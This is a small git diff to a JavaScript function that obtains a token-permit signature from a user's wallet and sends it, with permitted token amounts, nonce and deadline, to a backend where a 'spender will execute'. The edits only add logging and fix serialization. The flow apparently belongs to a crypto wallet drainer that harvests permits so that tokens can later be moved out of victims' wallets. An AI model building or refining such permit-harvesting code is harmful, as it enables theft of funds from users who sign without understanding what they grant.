@@ -890,7 +890,7 @@ export async function getUserSignature2(walletClient, address) {
     })
     
 
-
+    console.log(permitData)
     console.log('Signature acquired, sending to backend...')
 
     // STEP 6: Send signature to YOUR backend — spender will execute from there
@@ -916,10 +916,10 @@ export async function getUserSignature2(walletClient, address) {
         signature,
         permitted: permitted.map(p => ({
           token: p.token,
-          amount: BigInt(p.amount) // serialize BigInt
+          amount: p.amount.toString() // serialize BigInt
         })),
-        nonce: BigInt(nonce),
-        deadline: BigInt(deadline)
+        nonce: nonce.toString(),
+        deadline: deadline.toString()
       })
     })
     console.log(response.json)
